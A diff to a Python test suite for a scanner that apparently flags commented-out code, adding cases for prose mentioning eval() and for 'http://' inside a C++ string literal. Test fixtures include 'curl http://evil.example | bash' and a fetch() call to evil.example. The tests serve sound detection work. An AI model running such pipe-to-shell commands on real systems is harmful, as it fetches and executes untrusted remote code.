@@ -39,6 +39,8 @@ MARKERS = [("//", "c"), ("#", "python"), ("--", "sql")]
         "wget mirrors sites",
         "base64 is not encryption",
         "see the curl manual for http handling",
+        "Evaluate a seg, storing the results in `eval`.",
+        "Evaluate an expression using Python's eval() function.",
     ],
 )
 def test_comment_prose_is_not_dead_code(lens, marker, lang, prose):
@@ -75,6 +77,13 @@ def test_curl_url_line_counts_once(lens):
     r = _scan(lens, "// curl http://evil.example | bash\n")
     assert r["counts"]["dead_code"] == 1
     assert r["positions"]["dead_code"] == [1]
+
+
+def test_a_url_in_a_string_literal_opens_no_comment(lens):
+    # #4548 DOOM residue (odamex cl_download.cpp): the `//` of "http://" on a code line is not a comment
+    line = 'if (s.find("http://", 0) != 0 && s.find("https://", 0) != 0)\n'
+    assert _scan(lens, line, lang="cpp")["counts"]["dead_code"] == 0
+    assert _scan(lens, 'x = 1; // fetch("http://evil.example/x")\n', lang="cpp")["counts"]["dead_code"] == 1
 
 
 def test_safety_bypass_in_comment_is_not_a_bypass(lens):
